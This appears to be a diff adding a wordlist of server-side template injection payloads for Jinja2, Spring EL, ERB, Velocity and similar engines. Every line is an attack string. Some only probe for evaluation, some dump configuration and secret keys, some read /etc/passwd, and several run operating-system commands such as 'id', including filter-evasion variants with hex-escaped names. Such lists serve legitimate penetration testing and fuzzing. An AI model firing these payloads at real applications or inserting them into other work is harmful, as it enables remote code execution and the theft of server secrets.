@@ -1,0 +1,35 @@
+{{7*7}}
+{{7*'7'}}
+{{config}}
+{{config.items()}}
+{{settings}}
+{{self}}
+{{self.__dict__}}
+{{request}}
+{{request.environ}}
+{{request.environ['SECRET_KEY']}}
+{{''.__class__.__mro__}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{''.__class__.__bases__[0].__subclasses__()}}
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
+${7*7}
+${7*'7'}
+${config}
+${T(java.lang.Runtime).getRuntime().exec('id')}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.String).valueOf(new char[]{105,100})).getInputStream())}
+<%= 7*7 %>
+<%= system("id") %>
+<%= `id` %>
+#{7*7}
+#{config}
+*{7*7}
+*{T(java.lang.Runtime).getRuntime().exec('id')}
+${{7*7}}
+${{config}}
+{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
+{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd','r').read()}}
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("id").read()}}{%endif%}{% endfor %}
+{{''.class.mro()[1].subclasses()}}
+{{[]['\x5f\x5fclass\x5f\x5f']['\x5f\x5fbase\x5f\x5f']['\x5f\x5fsubclasses\x5f\x5f']()}}
+#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
